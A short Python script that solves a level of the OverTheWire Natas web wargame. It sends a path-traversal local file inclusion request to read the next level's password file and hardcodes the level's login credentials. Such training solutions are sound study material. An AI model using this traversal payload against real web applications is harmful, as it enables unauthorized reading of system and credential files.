#!/usr/bin/env python

# Local File Inclusion

# import the package requests which is for html information
import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

# url = 'http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' % username
url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % username

session = requests.Session()

# natas6 response = session.get(url + "includes/secret.inc",auth = (username, password))
# natas5 response = session.get(url,auth = (username, password), cookies = cookies)
# natas4 response = requests.get(url,auth = (username, password),headers = ref_headers)
# blank temp response = requests.get(url,auth = (username, password))

response = session.get(url,auth = (username, password))
content = response.text

# print(content)
# (.*)

print(re.findall("<br>\n(.*)\n\n<!--", content)[0])